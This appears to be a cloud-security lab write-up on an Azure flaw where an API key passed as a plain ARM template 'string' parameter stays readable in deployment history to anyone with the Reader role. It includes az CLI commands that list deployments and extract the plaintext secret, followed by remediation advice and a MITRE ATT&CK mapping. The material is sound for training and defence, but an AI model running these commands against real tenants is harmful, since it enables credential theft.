# ARM Deployment History Secret Exposure

**Provider:** Azure | **Category:** ARM / Credential Exposure

## Scenario

An infrastructure team deployed an ARM template that passed an admin API key as a `string`
parameter instead of `secureString`. Azure stores every deployment's parameter values in the
**deployment history** of the resource group — indefinitely, until manually purged.

Any identity with `Microsoft.Resources/deployments/read` (included in the **Reader** built-in
role) can retrieve the full deployment history including every plaintext `string` parameter,
even after the resource has been redeployed or the credential rotated.

## Attack Path

```
[Attacker] Reader on resource group
    |
    v
az deployment group list  -->  find app-infra-v1
    |
    v
az deployment group show  -->  .properties.parameters.adminApiKey.value
    |
    v
flag (string parameter, never encrypted)
```

### Step 1 — Log in and list deployments

```bash
az login -u <attacker_username> -p <attacker_password>

az deployment group list \
  --resource-group <resource_group_name> \
  --query "[].{name:name, timestamp:properties.timestamp, state:properties.provisioningState}" \
  --output table
```

### Step 2 — Dump all parameters from the deployment

```bash
az deployment group show \
  --resource-group <resource_group_name> \
  --name app-infra-v1 \
  --query "properties.parameters"
```

### Step 3 — Extract the flag

```bash
az deployment group show \
  --resource-group <resource_group_name> \
  --name app-infra-v1 \
  --query "properties.parameters.adminApiKey.value" \
  --output tsv
```

## The `secureString` vs `string` Difference

| Type | In az deployment show | In ARM template | In Activity Log |
|------|----------------------|-----------------|-----------------|
| `string` | **Plaintext** | Visible | Visible |
| `secureString` | `[secure]` masked | Hidden | Hidden |

Using `secureString` causes Azure to mask the value as `[secure]` in all API responses
and audit logs. It does **not** encrypt the value at rest differently — but it prevents
accidental exposure through the API surface.

## How to Fix in Production

1. **Use `secureString` for all secret parameters** in ARM templates and Bicep files.
2. **Purge deployment history** after rotation: `az deployment group delete --resource-group <rg> --name <name>`.
3. **Do not pass secrets as template parameters** at all — instead reference Key Vault secrets inline using `"reference": {"keyVault": {...}}`.
4. **Limit Reader role assignments** — not everyone who needs read access to resources needs to read deployment history.
5. **Enable Azure Policy** to audit or deny ARM deployments that use `string` type for parameters named `*password*`, `*secret*`, `*key*`.

## MITRE ATT&CK Mapping

| Technique | ID |
|---|---|
| Unsecured Credentials: Credentials in Files | [T1552.001](https://attack.mitre.org/techniques/T1552/001/) |
| Cloud Infrastructure Discovery | [T1580](https://attack.mitre.org/techniques/T1580/) |
| Valid Accounts: Cloud Accounts | [T1078.004](https://attack.mitre.org/techniques/T1078/004/) |
